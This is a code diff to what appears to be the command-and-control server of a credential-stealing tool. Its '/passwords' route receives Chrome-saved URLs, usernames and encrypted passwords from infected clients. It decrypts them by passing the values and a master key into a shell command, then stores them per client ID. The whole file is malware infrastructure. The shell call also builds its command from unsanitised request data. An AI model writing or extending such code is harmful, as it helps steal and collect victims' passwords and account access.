@@ -81,11 +81,11 @@ router.route('/checkout').get((req, res) => {
 
 function generatePasswordData(data, masterKey) {
     let buffer = ""
-    for(let object in data){
+    for (let object in data) {
         let url = data[object][0]['url']
         let username = data[object][1]['username']
         let password = data[object][2]['password']
-        if(url && username  && password ){
+        if (url && username && password) {
             buffer += `[+] Url: ${url}\n`
             buffer += `[+] Username: ${username}\n`
             let decryptedPass = child_process.execSync(`python ${appDir}\\scripts\\decrypt.py ${password} ${masterKey}`)
@@ -98,29 +98,32 @@ function generatePasswordData(data, masterKey) {
 //chrome passwords handle
 router.post("/passwords", function (req, res) {
     let clientId = req.headers['clientid'];
-    try {
-        let data = req.body;
+    let data = req.body;
+    let buffer;
+    if (data.response)
+        buffer = data.response
+    else{
         let masterKey = req.body['masterKey'];
-        if(data){
-            let buffer = generatePasswordData(data, masterKey)
-            const newResponse = new Response({
-                response_id: GenerateRandomId(6),
-                client_id: clientId,
-                response: buffer,
-                date: Utils.GetCurrentTimeDate()
-            });
-            newResponse.save()
-                .then(() => res.send())
-                .catch(err => {
-                    Utils.LogToFile(`Error adding passwords response: ${err.message}`)
-                    res.sendStatus(403)
-                })
-            Client.findOneAndUpdate({client_id: clientId}, {lastActive: Utils.GetCurrentTimeDate()}, {useFindAndModify: false},
-                function (err) {
-                    if (err)
-                        Utils.LogToFile(`Error updating last active for client ${clientId}`);
-                })
-        }
+        buffer = generatePasswordData(data, masterKey)
+    }
+    try {
+        const newResponse = new Response({
+            response_id: GenerateRandomId(6),
+            client_id: clientId,
+            response: buffer,
+            date: Utils.GetCurrentTimeDate()
+        });
+        newResponse.save()
+            .then(() => res.send())
+            .catch(err => {
+                Utils.LogToFile(`Error adding passwords response: ${err.message}`)
+                res.sendStatus(403)
+            })
+        Client.findOneAndUpdate({client_id: clientId}, {lastActive: Utils.GetCurrentTimeDate()}, {useFindAndModify: false},
+            function (err) {
+                if (err)
+                    Utils.LogToFile(`Error updating last active for client ${clientId}`);
+            })
     } catch (err) {
         Utils.LogToFile(`Error getting data from passwords request ${err}`);
         res.sendStatus(500)
